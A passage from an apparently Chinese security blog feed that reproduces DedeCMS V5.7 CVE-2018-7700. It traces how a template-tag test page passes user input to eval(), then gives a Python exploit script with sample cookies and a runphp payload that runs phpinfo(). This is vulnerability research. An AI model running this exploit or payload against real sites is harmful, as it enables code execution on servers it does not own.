class="line"><span class="keyword">else</span> <span class="variable">$pv</span> = <span class="keyword">new</span> PartView();</span><br><span class="line"></span><br><span class="line"><span class="variable">$pv</span>-&gt;SetTemplet(<span class="variable">$partcode</span>, <span class="string">&quot;string&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="variable">$pv</span>-&gt;Display();</span><br></pre></td></tr></table></figure><p>这里有一个 csrf_ check ，在上篇文章中讲过了，可以 GET 或者 POST 一个获取的 token</p><p><code>$partcode</code> 也可以直接传入，根据前面的复现来看，这个就是代码位置</p><p>很明显，需要用到 new PartView(); 来处理这个传入的代码，我们来看看他的 SetTemplet 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetTemplet</span>(<span class="params"><span class="variable">$temp</span>,<span class="variable">$stype</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$stype</span>==<span class="string">&quot;string&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dtp-&gt;LoadSource(<span class="variable">$temp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dtp-&gt;LoadTemplet(<span class="variable">$temp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;TypeID &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Fields[<span class="string">&#x27;position&#x27;</span>] = <span class="keyword">$this</span>-&gt;TypeLink-&gt;GetPositionLink(<span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Fields[<span class="string">&#x27;title&#x27;</span>] = <span class="keyword">$this</span>-&gt;TypeLink-&gt;GetPositionLink(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ParseTemplet();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>$this-&gt;dtp-&gt;LoadSource($temp);</code> 位于 include/dedetag.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LoadSource</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;taghashfile = <span class="variable">$filename</span> = DEDEDATA.<span class="string">&#x27;/tplcache/&#x27;</span>.md5(<span class="variable">$str</span>).<span class="string">&#x27;.inc&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>( !is_file(<span class="variable">$filename</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;LoadTemplate(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到，是将我们的内容 md5 变成文件名，文件名地址为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x2F;tplcache&#x2F;md5.inc</span><br></pre></td></tr></table></figure><p>如果不存在文件就储存，继续跟进  <code>$this-&gt;LoadTemplate($filename);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LoadTemplate</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;SetDefault();</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;SourceString = <span class="string">&quot; <span class="subst">$filename</span> Not Found! &quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ParseTemplet();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fp</span> = @fopen(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$line</span> = fgets(<span class="variable">$fp</span>,<span class="number">1024</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;SourceString .= <span class="variable">$line</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;LoadCache(<span class="variable">$filename</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ParseTemplet();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将文件内容读出来，放到了 <code>$this-&gt;SourceString</code> 中，然后加载 cache，没有 cache 就会进入 <code>$this-&gt;ParseTemplet();</code> ，我们先看这个方法，位于 include/dedetag.class.php ，这里边有着一系列的处理，大概就是将 <code>$this-&gt;SourceString</code> 中的标签转换成 php 代码，这里跳过，直接来到 950 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;IsCache)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;SaveCache();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IsCache 早在初始化的时候就已经设置为了 true，直接进入 <code>$this-&gt;SaveCache();</code></p><p>这里只看一部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = fopen(<span class="keyword">$this</span>-&gt;CacheFile.<span class="string">&#x27;.txt&#x27;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;TempMkTime.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="keyword">$this</span>-&gt;CacheFile,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">flock(<span class="variable">$fp</span>,<span class="number">3</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;&lt;&#x27;</span>.<span class="string">&#x27;?php&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>$this-&gt;CacheFile</code> 的定义待会儿再讲，就是 md5.inc 后面还加了一串，看到这里大概就明白了，所谓的 savecache 就是将标签代码转换为 php 代码后存储在文件中，我们看一个成功转换后的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转换前</span></span><br><span class="line">&#123;dede:field name=<span class="string">&#x27;source&#x27;</span> runphp=<span class="string">&#x27;yes&#x27;</span>&#125;phpinfo();&#123;/dede:field&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//转换后</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$z</span>[<span class="number">0</span>]=<span class="keyword">Array</span>(<span class="string">&quot;field&quot;</span>,<span class="string">&quot;phpinfo();&quot;</span>,<span class="number">0</span>,<span class="number">62</span>);</span><br><span class="line"><span class="variable">$z</span>[<span class="number">0</span>][<span class="number">4</span>]=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$z</span>[<span class="number">0</span>][<span class="number">4</span>][<span class="string">&#x27;name&#x27;</span>]=<span class="string">&quot;source&quot;</span>;</span><br><span class="line"><span class="variable">$z</span>[<span class="number">0</span>][<span class="number">4</span>][<span class="string">&#x27;runphp&#x27;</span>]=<span class="string">&quot;yes&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们回到前面加载 cache 的位置，进入 <code>$this-&gt;LoadCache($filename)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cdir</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$cachedir</span> = DEDEROOT.<span class="variable">$cfg_tplcache_dir</span>;</span><br><span class="line"><span class="variable">$ckfile</span> = str_replace(<span class="variable">$cdir</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>).substr(md5(<span class="variable">$filename</span>),<span class="number">0</span>,<span class="number">16</span>).<span class="string">&#x27;.inc&#x27;</span>;</span><br><span class="line"><span class="variable">$ckfullfile</span> = <span class="variable">$cachedir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$ckfile</span>;</span><br><span class="line"><span class="variable">$ckfullfile_t</span> = <span class="variable">$cachedir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$ckfile</span>.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;CacheFile = <span class="variable">$ckfullfile</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;TempMkTime = filemtime(<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$ckfullfile</span>)||!file_exists(<span class="variable">$ckfullfile_t</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就写了 <code>$this-&gt;CacheFile</code> 的值，实际上就是 md5.inc.md516.inc ，这里还有个文件，是在其基础上加了个  txt 后缀</p><p>不存在这两个文件的时候就是没有 cache ，就会返回创建 cache，也就是上面的过程</p><p>存在就继续往下走</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入缓冲数组</span></span><br><span class="line"><span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;CacheFile);</span><br><span class="line"><span class="variable">$errmsg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把缓冲数组内容读入类</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>(<span class="variable">$z</span>) &amp;&amp; is_array(<span class="variable">$z</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$z</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Count++;</span><br><span class="line">        <span class="variable">$ctag</span> = <span class="keyword">new</span> DedeTAg();</span><br><span class="line">        <span class="variable">$ctag</span>-&gt;CAttribute = <span class="keyword">new</span> DedeAttribute();</span><br><span class="line">        <span class="variable">$ctag</span>-&gt;IsReplace = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="variable">$ctag</span>-&gt;TagName = <span class="variable">$v</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$ctag</span>-&gt;InnerText = <span class="variable">$v</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$ctag</span>-&gt;StartPos = <span class="variable">$v</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="variable">$ctag</span>-&gt;EndPos = <span class="variable">$v</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="variable">$ctag</span>-&gt;TagValue = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$ctag</span>-&gt;TagID = <span class="variable">$k</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v</span>[<span class="number">4</span>]) &amp;&amp; is_array(<span class="variable">$v</span>[<span class="number">4</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="variable">$ctag</span>-&gt;CAttribute-&gt;Items = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$v</span>[<span class="number">4</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$ctag</span>-&gt;CAttribute-&gt;Count++;</span><br><span class="line">                <span class="variable">$ctag</span>-&gt;CAttribute-&gt;Items[<span class="variable">$k</span>]=<span class="variable">$v</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CTags[<span class="keyword">$this</span>-&gt;Count] = <span class="variable">$ctag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是将文件中的内容赋值给了 <code>$this-&gt;CTags</code></p><p>回到 include/arc.partview.class.php 的 SetTemplet 函数，进入 <code>$this-&gt;ParseTemplet();</code>，分析后可以知道这里也不是执行代码的位置</p><p>回到最开始的 dede/tag_test_action.php，来到 <code>$pv-&gt;Display();</code> ，跟进，来到 include/dedetag.class.php 的 GetResult 方法，在 738 行进入 <code>$this-&gt;AssignSysTag();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AssignSysTag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_sys_globals</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;=<span class="keyword">$this</span>-&gt;Count;<span class="variable">$i</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$CTag</span> = <span class="keyword">$this</span>-&gt;CTags[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这里就在循环获取 CTags 的内容，然后进行操作，下面是多个 if 语句，前面都可以略过，我们来到这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$CTag</span>-&gt;GetAtt(<span class="string">&#x27;runphp&#x27;</span>) == <span class="string">&#x27;yes&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;RunPHP(<span class="variable">$CTag</span>, <span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们根据上面给<code>$this-&gt;CTags</code> 赋值时的定义，可以知道</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctag</span> = <span class="keyword">new</span> DedeTAg();</span><br></pre></td></tr></table></figure><p>所以我们可以找到 <code>$CTag-&gt;GetAtt(&#39;runphp&#39;)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetAtt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;CAttribute-&gt;GetAtt(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将我们的 payload 代入来看</p><p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210627221315.png"></p><p>那就是使得 runphp=yes 就可以执行 Runphp 方法，进入该方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RunPHP</span>(<span class="params">&amp;<span class="variable">$refObj</span>, <span class="variable">$i</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$DedeMeValue</span> = <span class="variable">$phpcode</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$refObj</span>-&gt;GetAtt(<span class="string">&#x27;source&#x27;</span>)==<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$phpcode</span> = <span class="keyword">$this</span>-&gt;CTags[<span class="variable">$i</span>]-&gt;TagValue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$DedeMeValue</span> = <span class="keyword">$this</span>-&gt;CTags[<span class="variable">$i</span>]-&gt;TagValue;</span><br><span class="line">        <span class="variable">$phpcode</span> = <span class="variable">$refObj</span>-&gt;GetInnerText();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phpcode</span> = preg_replace(<span class="string">&quot;/&#x27;@me&#x27;|\&quot;@me\&quot;|@me/i&quot;</span>, <span class="string">&#x27;$DedeMeValue&#x27;</span>, <span class="variable">$phpcode</span>);</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$phpcode</span>); <span class="comment">//or die(&quot;&lt;xmp&gt;$phpcode&lt;/xmp&gt;&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;CTags[<span class="variable">$i</span>]-&gt;TagValue = <span class="variable">$DedeMeValue</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;CTags[<span class="variable">$i</span>]-&gt;IsReplace = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显我们的 payload 不满足第一个条件，就会进入 else，我们来看 <code>$phpcode</code> 的获取，进入 <code>$refObj-&gt;GetInnerText();</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetInnerText</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;InnerText;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接就可以获取到 phpinfo(); 最后被 eval</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;menuitems&#x27;</span>: <span class="string">&#x27;1_1%2C2_1%2C3_1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;03vl33l9qoqgkud8lotrjqao61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_csrf_name_038be8bf&#x27;</span>: <span class="string">&#x27;0bfdaa5a43a74e6a73c647bd6bccea74&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_csrf_name_038be8bf__ckMd5&#x27;</span>: <span class="string">&#x27;abc564ee99b944d5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeUserID&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeUserID__ckMd5&#x27;</span>: <span class="string">&#x27;d217f47f5438b1c4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeLoginTime&#x27;</span>: <span class="string">&#x27;1624719766&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeLoginTime__ckMd5&#x27;</span>: <span class="string">&#x27;8f80d0af54e33e54&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span>(<span class="params">url</span>):</span></span><br><span class="line">    uploadurl = url + <span class="string">&#x27;/dede/tpl.php?action=upload&#x27;</span></span><br><span class="line">    html = s.get(uploadurl, cookies=cookies).text</span><br><span class="line">    token = re.findall(<span class="string">&quot;&lt;input name=&#x27;token&#x27; type=&#x27;hidden&#x27; value=&#x27;(.*?)&#x27;&quot;</span>, html)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getShell</span>(<span class="params">url, token</span>):</span></span><br><span class="line">    getshellurl = url + <span class="string">&#x27;/dede/tag_test_action.php&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;partcode&#x27;</span>: <span class="string">&quot;&#123;dede:field name=&#x27;source&#x27; runphp=&#x27;yes&#x27;&#125;phpinfo();&#123;/dede:field&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    html = s.post(getshellurl, data=data, cookies=cookies).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;PHP Version&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] getshell success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] getshell error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/dedecms&#x27;</span></span><br><span class="line">    token = getToken(url)</span><br><span class="line">    getShell(url, token)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这个漏洞只是 dede 提供的一个标签代码测试的功能，但是被利用了，基本上只要进到后台，利用这个还是很容易getshell的，有关于 dede 的标签的构造的内容，很多都省去了，但对阅读应该没有太大的问题</p><p>该过程实际上就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板 -&gt; 全局标记测试</span><br></pre></td></tr></table></figure><p>然后填入自己的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;dede:field name=<span class="string">&#x27;source&#x27;</span> runphp=<span class="string">&#x27;yes&#x27;</span>&#125;phpinfo();&#123;/dede:field&#125;</span><br></pre></td></tr></table></figure><p>这个 CVE 最着重的地方是这个 token 的绕过，但是不是只要是进入了后台，很容易就可以获取到 token 么，那这个 token 的绕过就没有太大必要了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/">https://wiki.bylibrary.cn/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2018-7700/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> dedecms </tag>
            
            <tag> 代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS V5.7 SP2后台代码执行漏洞复现</title>
      <link href="2021/06/26/DedeCMS-V5-7-SP2%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/06/26/DedeCMS-V5-7-SP2%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
